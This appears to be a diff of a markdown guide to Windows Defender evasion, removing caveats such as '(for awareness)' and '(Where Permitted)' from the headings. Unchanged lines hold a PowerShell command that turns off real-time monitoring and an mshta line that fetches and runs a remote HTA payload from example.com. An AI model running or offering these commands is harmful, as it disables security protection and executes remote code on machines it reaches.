@@ -23,11 +23,11 @@ Defender is deeply integrated into Windows and cannot be easily removed in moder
 
 ## Common Windows Defender Evasion Techniques
 
-### 1. Disabling Real-Time Protection (Where Permitted)
+### 1. Disabling Real-Time Protection
 
 Attackers may attempt to reduce monitoring by disabling real-time scanning.
 
-#### Example Commands (for awareness)
+#### Example Commands
 
 ```powershell
 Set-MpPreference -DisableRealtimeMonitoring $true
@@ -99,7 +99,7 @@ mshta http://example.com/payload.hta
 
 ---
 
-### 6. Process Injection (Conceptual Evasion)
+### 6. Process Injection
 
 Code is executed inside trusted processes to hide malicious activity.
 
